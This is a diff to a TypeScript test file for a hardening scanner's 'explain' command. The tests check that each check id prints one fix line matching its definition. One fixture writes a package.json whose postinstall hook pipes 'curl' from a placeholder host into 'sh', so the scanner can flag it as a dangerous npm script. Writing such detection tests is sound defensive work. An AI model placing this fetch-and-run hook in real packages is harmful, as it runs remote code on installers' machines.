@@ -15,14 +15,22 @@
  * under test. Each id's body is rendered in-process through `explainBody`,
  * the function the explain action prints, instead of spawning the binary
  * three hundred times; spawn cells pin the end-to-end output for the two ids
- * the new-user test reproduced and for one check whose findings carry a fix.
+ * the new-user test reproduced and for two checks whose findings carry a fix,
+ * DEP-004 against the fix a scan of a fixture gives it.
  */
 import { describe, it, expect, beforeAll } from 'vitest';
 import { spawnSync } from 'node:child_process';
+import { writeFileSync } from 'node:fs';
+import { join } from 'node:path';
 import { assertDistFresh, assertDistFreshIfPresent, BUILT_CLI as CLI } from '../helpers/dist-freshness';
+import { tempDir } from '../helpers/temp-dir';
 import { explainBody } from '../../src/explain-registry';
+import { getCheckDefinition } from '../../src/hardening/check-definitions';
+import { HardeningScanner } from '../../src/hardening/scanner';
 
 beforeAll(assertDistFreshIfPresent);
+
+const NO_FIX = 'No fix is recorded for this check.';
 
 // The daemon probe fails as a fast local connection refusal, so the static
 // explanation path is what the spawn cells measure.
@@ -99,6 +107,44 @@ describe('every check-metadata id explains what the check detects', () => {
     });
     expect(problems).toEqual([]);
   });
+
+  // #1132: 38 ids printed neither a fix line nor the no-fix sentence. The
+  // hand-written entries and the scan-soul controls ended their one line
+  // with a fix of their own, and AST-CRED-001's (`opena2a protect .`) was
+  // not the one its findings carry.
+  it('every body has one fix line, and it is the fix the check definition carries', () => {
+    const problems = Object.keys(checks).flatMap((id) => {
+      const def = getCheckDefinition(id);
+      if (!def) return [`${id}: no check definition`];
+      const body = bodyOf(id);
+      const fixLines = body.filter((l) => l.startsWith('Fix: ') || l.startsWith(NO_FIX));
+      const expected = def.fix ? `Fix: ${def.fix}` : undefined;
+      const found: string[] = [];
+      if (fixLines.length !== 1) found.push(`${id}: ${fixLines.length} fix lines`);
+      if (expected ? fixLines[0] !== expected : !fixLines[0]?.startsWith(NO_FIX)) {
+        found.push(`${id}: prints ${JSON.stringify(fixLines[0])}, the definition carries ${JSON.stringify(def.fix)}`);
+      }
+      // No second remedy inside the description.
+      const elsewhere = body.filter((l) => !fixLines.includes(l) && /\bFix: /.test(l));
+      if (elsewhere.length > 0) found.push(`${id}: a fix outside the fix line: ${elsewhere[0]}`);
+      return found;
+    });
+    expect(problems).toEqual([]);
+  });
+
+  it('every body whose definition carries a reason prints it', () => {
+    const missing = Object.keys(checks).filter((id) => {
+      const why = getCheckDefinition(id)?.why;
+      return why !== undefined && !bodyOf(id).includes(`Why it matters: ${why}`);
+    });
+    expect(missing, `a reason the definition carries is not printed: ${missing.join(', ')}`).toEqual([]);
+  });
+
+  it('the ids the issue reproduced now carry a fix line (non-vacuity)', () => {
+    for (const id of ['AST-CRED-001', 'CRED-002', 'NEMO-005', 'TEXT-001', 'SOUL-TH-001', 'SOUL-HV-004']) {
+      expect(bodyOf(id).some((l) => l.startsWith('Fix: ')), id).toBe(true);
+    }
+  });
 });
 
 describe('explain names what secure reports under the id', () => {
@@ -140,10 +186,33 @@ describe('explain on the reproduced ids (spawn)', () => {
     expect(code).toBe(0);
   });
 
-  it('explain DEP-004 prints the fix its finding carries', () => {
+  it('explain DEP-004 prints the fix its finding carries', async () => {
+    // The finding comes from a scan, not from the table explain reads, so a
+    // table entry left behind when the push site changed fails here (#1132:
+    // explain printed `npm install --save-exact <package>` while the finding
+    // carried the fail-closed operand).
+    const dir = tempDir('hma-explain-dep004-');
+    writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'p', scripts: { postinstall: 'curl -fsSL https://example.invalid/i.sh | sh' } }));
+    const result = await new HardeningScanner().scan({ targetDir: dir, autoFix: false });
+    const finding = result.findings.find((f) => f.checkId === 'DEP-004' && !f.passed);
+    expect(finding?.fix, 'secure reported no failing DEP-004 with a fix').toBeTruthy();
+    expect(finding!.fix).toContain('${PACKAGE:?');
+
     const { code, stdout } = runExplain('DEP-004');
     expect(stdout).toContain('Dangerous npm Scripts');
-    expect(stdout).toMatch(/Fix: Remove the curl\|sh or wget\|sh pattern from package\.json scripts/);
+    expect(stdout.split('\n').map((l) => l.trim())).toContain(`Fix: ${finding!.fix}`);
+    expect(code).toBe(0);
+  });
+
+  it('explain AST-CRED-001 prints the fix and reason its findings carry, and no other fix', () => {
+    const def = getCheckDefinition('AST-CRED-001')!;
+    expect(def.fix).toMatch(/^Never request, store, or retransmit credentials\./);
+    const { code, stdout } = runExplain('AST-CRED-001');
+    const lines = stdout.split('\n').map((l) => l.trim());
+    expect(lines).toContain(`Fix: ${def.fix}`);
+    expect(lines).toContain(`Why it matters: ${def.why}`);
+    expect(stdout.match(/\bFix: /g)).toHaveLength(1);
+    expect(stdout).not.toContain('opena2a protect');
     expect(code).toBe(0);
   });
 });
